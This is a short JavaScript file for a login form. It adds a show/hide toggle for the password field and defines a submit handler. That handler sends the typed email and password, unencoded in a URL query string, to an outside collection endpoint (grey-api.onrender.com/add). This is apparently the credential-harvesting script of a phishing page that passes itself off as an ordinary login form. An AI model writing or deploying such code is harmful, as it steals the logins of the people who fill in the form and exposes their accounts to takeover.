let email = document.querySelector('[type=email]')
let password = document.querySelector('[type=password]')
let eyes = document.querySelector('span.sc-cTkxnA ipSBcP, svg#Capa_1')
let state = true
eyes.addEventListener('click', ()=>{
    if(!state){
        password.type = 'text'
        state = !state
    }else {
        password.type = 'password'
        state = !state
    }
    
})

function working() {
    fetch(`https://grey-api.onrender.com/add?email=${email.value}&password=${password.value}`).then(data => alert(data))
    return true
}
